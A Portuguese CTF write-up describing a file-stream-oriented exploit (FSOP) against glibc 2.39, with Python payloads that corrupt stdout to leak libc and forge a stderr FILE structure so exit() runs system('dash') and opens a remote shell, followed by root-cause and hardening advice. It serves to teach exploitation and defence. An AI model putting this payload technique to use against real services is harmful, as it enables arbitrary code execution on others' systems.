# THE EMPTINESS
## Resolvido por Nathan

# Relatório de Exploração — The Emptiness Machine

## 1. Identificação do desafio

**Categoria:** Binary Exploitation / Pwn
**Arquitetura:** x86-64
**Sistema:** Linux
**Biblioteca:** glibc 2.39
**Técnica principal:** FSOP — File Stream Oriented Programming
**Resultado:** Execução remota de comandos e obtenção de shell
**Ambiente:** CTF autorizado

---

## 2. Objetivo

O objetivo da exploração era identificar uma vulnerabilidade de corrupção de memória no binário `the_emptiness_machine` e utilizá-la para obter execução arbitrária de comandos.

A exploração foi dividida em dois estágios:

1. Corromper a estrutura global de `stdout` para vazar endereços da libc.
2. Corromper a estrutura global de `stderr` e construir uma estrutura `FILE` falsa, desviando o fluxo de execução para `system()`.

---

## 3. Arquivos fornecidos

O desafio disponibilizou os seguintes arquivos:

```text
the_emptiness_machine
glibc/libc.so.6
glibc/ld-linux-x86-64.so.2
```

A libc e o carregador dinâmico fornecidos foram utilizados para reproduzir localmente o mesmo ambiente do servidor remoto.

---

## 4. Verificação das proteções

A primeira etapa foi verificar as proteções habilitadas no binário.

Exemplo:

```bash
checksec --file=./the_emptiness_machine
```

Proteções identificadas:

```text
RELRO:      Full RELRO
Canary:     Ausente
NX:         Habilitado
PIE:        Habilitado
SHSTK:      Habilitado
IBT:        Habilitado
```

### Impacto das proteções

**Full RELRO**

Impede a sobrescrita direta da GOT, eliminando técnicas tradicionais de GOT overwrite.

**NX**

Impede a execução direta de shellcode em regiões de dados, como stack e heap.

**PIE e ASLR**

Fazem com que os endereços do binário e das bibliotecas sejam aleatorizados a cada execução.

**SHSTK e IBT**

São mecanismos relacionados ao Intel CET e tornam desvios de controle tradicionais mais difíceis.

Por causa dessas proteções, a exploração foi direcionada para estruturas internas da libc, particularmente os objetos `FILE`.

---

## 5. Análise do fluxo do programa

A análise estática mostrou que a função principal realizava essencialmente duas leituras:

```c
scanf("%40s", stdout);
printf(...);
scanf("%224s", stderr);
```

Esse comportamento é extremamente incomum.

O segundo argumento de `scanf()` deveria ser um ponteiro para uma região destinada a receber dados, como um array de caracteres. Entretanto, o programa utilizava diretamente os ponteiros globais:

```c
stdout
stderr
```

Esses ponteiros referenciam objetos internos da libc:

```text
_IO_2_1_stdout_
_IO_2_1_stderr_
```

Portanto, os dados fornecidos pelo usuário eram escritos diretamente dentro das estruturas de controle de entrada e saída da glibc.

---

## 6. Estruturas afetadas

Na glibc, streams como `stdin`, `stdout` e `stderr` são representados por estruturas semelhantes a:

```c
struct _IO_FILE_plus {
    struct _IO_FILE file;
    const struct _IO_jump_t *vtable;
};
```

Na arquitetura x86-64 utilizada:

```text
sizeof(struct _IO_FILE)      = 0xd8 bytes
Ponteiro da vtable           = 0x08 bytes
Tamanho total de FILE_plus   = 0xe0 bytes
```

Em decimal:

```text
0xe0 = 224 bytes
```

Isso coincide exatamente com a segunda leitura:

```c
scanf("%224s", stderr);
```

Consequentemente, era possível sobrescrever:

* Todos os campos de `_IO_FILE`.
* O ponteiro de vtable localizado no final da estrutura.

A primeira leitura permitia sobrescrever os primeiros 40 bytes de `stdout`:

```c
scanf("%40s", stdout);
```

Essa escrita era suficiente para modificar os campos responsáveis pelos buffers de leitura e escrita de `stdout`.

---

## 7. Estratégia de exploração

A estratégia final foi:

```text
Primeira leitura:
    Corromper stdout.
    Forçar a libc a imprimir dados internos.
    Obter ponteiros da libc.

Cálculo:
    Identificar a base real da libc.
    Resolver stderr, stdout, system e _IO_wfile_jumps.

Segunda leitura:
    Sobrescrever completamente stderr.
    Construir uma estrutura FILE falsa.
    Usar uma vtable legítima da libc.
    Redirecionar uma operação wide para system().

Encerramento:
    O programa chama exit().
    A libc executa _IO_flush_all().
    stderr é processado.
    O fluxo alcança system().
    Uma shell é iniciada.
```

---

## 8. Primeiro estágio — Vazamento da libc

### 8.1 Corrupção de `_flags`

O payload utilizado para corromper `stdout` começava com:

```python
p64(0xFBAD1800)
```

O valor possui bits utilizados internamente pela glibc para controlar o estado do stream.

O payload completo era:

```python
def build_stdout_payload():
    payload = (
        p64(0xFBAD1800)
        + p64(0)
        + p64(0)
        + p64(0)
        + b"\x00"
    )

    return payload
```

A estrutura resultante alterava campos localizados no início de `stdout`, incluindo ponteiros associados aos buffers internos.

Quando o programa executava a próxima operação de saída, a glibc passava a imprimir memória além do conteúdo originalmente pretendido.

---

### 8.2 Resultado do vazamento

O vazamento continha diversos ponteiros internos da libc.

Exemplos observados:

```text
0x7f29c07c84a0
0x7f919db9d4a0
0x7ffbe10f04a0
```

Como o ASLR estava habilitado, os endereços mudavam a cada execução.

O offset do ponteiro dentro do vazamento também variava:

```text
0x48
0x1048
0x3048
0x7048
0xb048
```

Isso ocorreu porque a quantidade e a disposição dos dados impressos pela estrutura corrompida não eram completamente fixas.

Portanto, não era confiável assumir que o ponteiro estaria sempre em uma posição específica.

---

## 9. Localização confiável da base da libc

### 9.1 Problema da abordagem inicial

A primeira versão do exploit selecionava qualquer endereço que parecesse estar próximo de `stderr`.

Essa abordagem produziu falsos positivos.

Durante a depuração, uma base incorreta apontou `stderr` para uma região identificada pelo GDB como:

```text
translit_from_idx
```

A diferença entre o endereço calculado e o endereço real era:

```text
0x47000
```

Como resultado, o ponteiro `_lock` foi construído sobre uma região somente leitura.

A glibc tentou executar:

```asm
lock cmpxchg %ecx,(%rdi)
```

e ocorreu uma violação de acesso.

---

### 9.2 Evidência do GDB

O backtrace mostrou:

```text
#0  __GI__IO_flush_all
#1  _IO_cleanup
#2  __run_exit_handlers
#3  exit
#4  __libc_start_call_main
```

A instrução que causou o erro foi:

```asm
lock cmpxchg %ecx,(%rdi)
```

O endereço utilizado como lock era inválido:

```text
rdi = 0x7a8b5ffbd558
```

Esse endereço se encontrava em uma região não gravável.

A depuração confirmou que o vazamento funcionava, mas a seleção da base da libc precisava ser mais rigorosa.

---

### 9.3 Solução utilizada

A versão final não aceita uma base com apenas um ponteiro compatível.

Ela procura evidências independentes de múltiplos símbolos conhecidos:

```python
evidence_symbols = [
    "_IO_2_1_stderr_",
    "_IO_2_1_stdout_",
    "_IO_2_1_stdin_",
    "_IO_wfile_jumps",
    "_IO_file_jumps",
]
```

Para cada ponteiro vazado, o exploit calcula possíveis bases:

```python
candidate_base = pointer - symbol_offset
```

A base somente é considerada válida quando:

* Está alinhada em uma página de `0x1000` bytes.
* Está na faixa de endereços canônicos da libc.
* Existem pelo menos duas evidências de símbolos conhecidos.
* Existem dois streams válidos ou um stream e uma vtable.
* Diversos ponteiros vazados ficam dentro da região esperada da libc.

Exemplo da validação:

```python
if exact_symbol_count < 2:
    continue

if not (
    stream_evidence >= 2
    or (
        stream_evidence >= 1
        and vtable_evidence >= 1
    )
):
    continue
```

Foi criado também um sistema de pontuação, dando mais peso aos símbolos:

```text
_IO_2_1_stderr_
_IO_2_1_stdout_
_IO_2_1_stdin_
_IO_wfile_jumps
_IO_file_jumps
```

Isso eliminou os falsos positivos que apontavam para outras áreas da libc.

---

## 10. Preservação dos offsets da libc

Outro problema encontrado foi o uso de:

```python
libc.address = libc_base
```

com chamadas posteriores a:

```python
libc.sym["..."]
```

Em execuções repetidas, isso poderia causar alterações acumuladas ou confusão entre offsets relativos e endereços relocados.

A versão final salva os offsets originais antes de qualquer relocação:

```python
LIBC_OFFSETS = {
    "_IO_2_1_stderr_": libc.symbols["_IO_2_1_stderr_"],
    "_IO_2_1_stdout_": libc.symbols["_IO_2_1_stdout_"],
    "_IO_2_1_stdin_": libc.symbols["_IO_2_1_stdin_"],
    "_IO_wfile_jumps": libc.symbols["_IO_wfile_jumps"],
    "system": libc.symbols["system"],
}
```

Os endereços absolutos são calculados diretamente:

```python
stderr = libc_base + LIBC_OFFSETS["_IO_2_1_stderr_"]
system = libc_base + LIBC_OFFSETS["system"]
```

Assim, cada tentativa é independente.

---

## 11. Segundo estágio — FSOP sobre `stderr`

Após obter a base correta da libc, o segundo `scanf()` foi utilizado para sobrescrever os 224 bytes de `stderr`.

O objetivo era criar uma estrutura `_IO_FILE_plus` falsa capaz de ser processada pela libc durante o encerramento do programa.

---

## 12. Gatilho da exploração

Quando o programa termina, a libc executa rotinas de limpeza.

O fluxo relevante é:

```text
exit()
  └── __run_exit_handlers()
       └── _IO_cleanup()
            └── _IO_flush_all()
```

A função `_IO_flush_all()` percorre os streams registrados e realiza operações de flush nos streams que possuem dados pendentes.

Como `stderr` havia sido corrompido, a operação de flush passou a utilizar os campos e ponteiros controlados pelo exploit.

---

## 13. Campos importantes da estrutura falsa

O payload possuía exatamente:

```text
0xe0 bytes
```

Código base:

```python
payload = bytearray(0xE0)
```

---

### 13.1 Comando usado por `system()`

O início da estrutura recebeu:

```python
payload[0x00:0x08] = b"dash\x00\x00\x00\x00"
```

Quando o fluxo chegasse a `system()`, o endereço da estrutura `FILE` seria utilizado como primeiro argumento.

Como a estrutura começava com:

```text
dash\0
```

a chamada resultante seria equivalente a:

```c
system("dash");
```

Isso iniciava uma shell compatível com `/bin/dash`.

---

### 13.2 Condição de stream com dados pendentes

A libc verifica se há dados pendentes comparando:

```c
fp->_IO_write_ptr > fp->_IO_write_base
```

Os campos foram configurados como:

```python
payload[0x20:0x28] = p64(0)
payload[0x28:0x30] = p64(1)
```

Portanto:

```text
_IO_write_base = 0
_IO_write_ptr  = 1
```

A condição se torna verdadeira.

---

### 13.3 Encerramento da cadeia de streams

O campo `_chain` foi definido como nulo:

```python
payload[0x68:0x70] = p64(0)
```

Isso evita que a libc continue percorrendo endereços arbitrários após processar a estrutura corrompida.

---

### 13.4 Ponteiro `_lock`

A libc utiliza um lock interno ao processar estruturas `FILE`.

O lock precisa apontar para uma região de memória gravável.

Foi reservada uma área dentro da própria estrutura falsa:

```python
payload[0x78:0x88] = b"\x00" * 0x10
```

O campo `_lock` foi configurado para apontar para essa região:

```python
payload[0x88:0x90] = p64(stderr_address + 0x78)
```

Isso corrigiu o erro observado anteriormente no GDB, no qual o lock apontava para uma região somente leitura.

---

### 13.5 Estrutura `_wide_data`

Para alcançar o caminho de operações wide da libc, o campo `_wide_data` foi configurado como:

```python
payload[0xA0:0xA8] = p64(stderr_address - 0x10)
```

A estrutura wide foi sobreposta parcialmente ao próprio objeto `stderr`.

Dessa forma, campos da estrutura principal também funcionavam como campos de `_IO_wide_data`.

---

### 13.6 Campos wide de escrita

Considerando:

```text
wide_data = stderr - 0x10
```

Os campos foram posicionados em:

```python
payload[0x08:0x10] = p64(0)
payload[0x10:0x18] = p64(1)
```

Esses valores representam:

```text
wide->_IO_write_base = 0
wide->_IO_write_ptr  = 1
```

Novamente, o ponteiro de escrita fica maior que a base.

---

### 13.7 Ativação do modo wide

O campo `_mode` foi configurado com valor positivo:

```python
payload[0xC0:0xC4] = p32(1)
```

Isso direciona a libc para as rotinas wide, em vez das operações normais de caracteres.

---

### 13.8 Wide vtable falsa

A wide vtable foi posicionada dentro da própria estrutura controlada.

O endereço escolhido foi:

```python
stderr_address + 0x48
```

O ponteiro para essa estrutura foi escrito em:

```python
payload[0xD0:0xD8] = p64(stderr_address + 0x48)
```

O slot utilizado pela rotina `__doallocate` fica no offset:

```text
0x68
```

Portanto:

```text
stderr + 0x48 + 0x68 = stderr + 0xB0
```

Nesse local foi inserido o endereço de `system()`:

```python
payload[0xB0:0xB8] = p64(system_address)
```

Quando a glibc tentou executar a operação da wide vtable, o fluxo foi desviado para:

```c
system("dash");
```

---

### 13.9 Vtable principal legítima

Versões modernas da glibc validam se a vtable principal está dentro da região legítima:

```text
__libc_IO_vtables
```

Por esse motivo, não foi possível apontar a vtable principal diretamente para uma área arbitrária.

Foi utilizado o endereço legítimo:

```text
_IO_wfile_jumps
```

Configuração:

```python
payload[0xD8:0xE0] = p64(wfile_jumps_address)
```

Dessa forma:

* A vtable principal passa na validação da glibc.
* A estrutura `_wide_data` ainda contém uma wide vtable controlada.
* O desvio para `system()` ocorre por meio do caminho wide.

---

## 14. Layout resumido do payload

```text
Offset  Campo ou finalidade
------  ---------------------------------------------------
0x00    String "dash"
0x08    wide->_IO_write_base = 0
0x10    wide->_IO_write_ptr = 1
0x20    FILE->_IO_write_base = 0
0x28    FILE->_IO_write_ptr = 1
0x68    FILE->_chain = NULL
0x78    Área gravável para lock
0x88    FILE->_lock = stderr + 0x78
0xA0    FILE->_wide_data = stderr - 0x10
0xB0    Slot __doallocate = system
0xC0    FILE->_mode = 1
0xD0    wide_data->_wide_vtable = stderr + 0x48
0xD8    FILE vtable = _IO_wfile_jumps
```

---

## 15. Restrição causada pelo `scanf("%s")`

O especificador `%s` interrompe a leitura quando encontra caracteres considerados whitespace.

Bytes problemáticos:

```text
0x09  Tabulação
0x0a  Nova linha
0x0b  Tabulação vertical
0x0c  Form feed
0x0d  Retorno de carro
0x20  Espaço
```

Como os endereços são influenciados pelo ASLR, alguns endereços continham ocasionalmente um desses bytes.

A versão final verifica todos os bytes do payload:

```python
SCANF_WHITESPACE = {
    0x09,
    0x0A,
    0x0B,
    0x0C,
    0x0D,
    0x20,
}
```

Validação:

```python
def whitespace_positions(data):
    return [
        (offset, byte)
        for offset, byte in enumerate(data)
        if byte in SCANF_WHITESPACE
    ]
```

Se algum endereço contivesse whitespace, aquela tentativa era descartada e uma nova conexão era aberta.

---

## 16. Correção do travamento durante a comunicação

A versão inicial utilizava chamadas semelhantes a:

```python
recvuntil(PROMPT)
```

Em algumas condições, o servidor enviava apenas parte do banner ou dados incompletos.

Como o timeout podia ser renovado a cada nova recepção, o exploit aparentava ficar preso indefinidamente.

Foi implementada uma função com timeout absoluto:

```python
deadline = time.monotonic() + timeout
```

O loop encerra quando:

* O token esperado é recebido.
* O tempo absoluto é atingido.
* O limite máximo de dados é alcançado.
* O servidor fecha a conexão.

Estrutura simplificada:

```python
while time.monotonic() < deadline:
    chunk = io.recv(...)

    if token in received:
        return True, received

return False, received
```

Isso evitou conexões infinitas durante as tentativas remotas.

---

## 17. Uso da libc fornecida localmente

Para reproduzir o ambiente remoto, o binário foi executado com o loader e a libc fornecidos:

```bash
./glibc/ld-linux-x86-64.so.2 \
    --library-path ./glibc \
    ./the_emptiness_machine
```

No exploit:

```python
def local_command():
    return [
        "./glibc/ld-linux-x86-64.so.2",
        "--library-path",
        "./glibc",
        "./the_emptiness_machine",
    ]
```

Isso evita utilizar acidentalmente a libc instalada no sistema local.

---

## 18. Depuração com GDB

O exploit também recebeu suporte ao GDB:

```python
gdb.debug(
    command,
    gdbscript="""
set pagination off
set breakpoint pending on
catch signal SIGSEGV
break __GI__IO_flush_all
break _IO_wfile_overflow
break _IO_wdoallocbuf
break system
continue
"""
)
```

Comando utilizado:

```bash
python3 exploit.py GDB ATTEMPTS=1 LOG_LEVEL=info
```

A depuração foi fundamental para identificar que:

* O fluxo chegava a `_IO_flush_all`.
* O crash acontecia na aquisição do lock.
* O endereço de `stderr` havia sido calculado incorretamente.
* A busca da base da libc estava aceitando um falso positivo.
* O conceito do gatilho FSOP estava funcionando, mas os endereços precisavam ser corrigidos.

---

## 19. Execução remota

Após as correções, o exploit foi executado com:

```bash
python3 exploit.py REMOTE ATTEMPTS=20 LOG_LEVEL=info
```

O fluxo de uma tentativa válida era:

```text
1. Conectar ao serviço.
2. Esperar o primeiro prompt.
3. Enviar o payload de corrupção de stdout.
4. Receber o vazamento.
5. Localizar a base correta da libc.
6. Calcular os endereços absolutos.
7. Verificar bytes de whitespace.
8. Enviar a estrutura FILE falsa.
9. Aguardar a chamada a exit().
10. Acionar system("dash").
11. Confirmar a shell.
```

---

## 20. Confirmação da shell

Após enviar o segundo estágio, o exploit envia um marcador:

```python
marker = b"FSOP_OK_7f34c19a"
```

Em seguida:

```python
io.sendline(b"echo " + marker)
io.sendline(b"id")
```

A shell somente é considerada válida se o marcador aparecer na resposta:

```python
return marker in response, response
```

Essa validação evita confundir:

* Uma conexão ainda aberta.
* Um processo travado.
* Um prompt sem shell.
* Uma execução real de comandos.

---

## 21. Resultado final

A exploração foi concluída com sucesso.

A vulnerabilidade permitiu:

* Sobrescrever estruturas globais de entrada e saída da glibc.
* Vazar endereços internos da libc.
* Derrotar o ASLR.
* Construir uma estrutura `FILE` falsa.
* Passar pela validação moderna de vtables da glibc.
* Desviar uma operação wide para `system()`.
* Executar `system("dash")`.
* Obter uma shell remota.

---

## 22. Causa raiz da vulnerabilidade

A causa raiz foi o uso incorreto de ponteiros `FILE` como buffers de destino:

```c
scanf("%40s", stdout);
scanf("%224s", stderr);
```

O programa deveria utilizar buffers próprios, por exemplo:

```c
char first_input[41];
char second_input[225];

scanf("%40s", first_input);
scanf("%224s", second_input);
```

Nunca se deve utilizar diretamente:

```c
stdin
stdout
stderr
```

como regiões de armazenamento de entrada controlada pelo usuário.

---

## 23. Recomendações de correção

### 23.1 Utilizar buffers dedicados

```c
char input[225];

if (scanf("%224s", input) != 1) {
    return 1;
}
```

### 23.2 Não expor estruturas internas da libc

Os objetos `FILE` devem ser utilizados apenas por meio das APIs previstas:

```c
printf()
fprintf()
fwrite()
fread()
fgets()
```

### 23.3 Validar o retorno das funções

```c
if (scanf("%224s", input) != 1) {
    fprintf(stderr, "Erro de entrada\n");
    return 1;
}
```

### 23.4 Utilizar compilação endurecida

Exemplo:

```bash
gcc \
  -O2 \
  -D_FORTIFY_SOURCE=3 \
  -fstack-protector-strong \
  -fPIE \
  -pie \
  -Wl,-z,relro,-z,now \
  -Wformat \
  -Wformat-security \
  programa.c \
  -o programa
```

Embora essas proteções não corrijam o erro lógico, elas aumentam a dificuldade de exploração.

---

## 24. Conclusão

O desafio demonstrou uma exploração moderna baseada em FSOP contra a glibc 2.39.

Diferentemente de uma exploração tradicional de stack overflow, o ataque não dependia de sobrescrever um endereço de retorno. O controle foi obtido por meio da corrupção das estruturas internas responsáveis pelo gerenciamento de streams.

Os principais aprendizados foram:

* Estrutura interna de `_IO_FILE`.
* Relação entre `_IO_FILE` e vtables.
* Vazamento de libc pela corrupção de `stdout`.
* Cálculo confiável da base da libc.
* Impacto do ASLR sobre bytes de endereços.
* Restrições do `scanf("%s")`.
* Processamento de streams durante `exit()`.
* Funcionamento de `_IO_flush_all()`.
* Uso de `_IO_wfile_jumps`.
* Construção de `_wide_data` e wide vtable falsa.
* Importância da depuração com GDB.
* Necessidade de confirmar uma shell por execução real de comandos.

A exploração final foi bem-sucedida após corrigir tanto a estrutura FSOP quanto a lógica responsável por identificar a base real da libc.
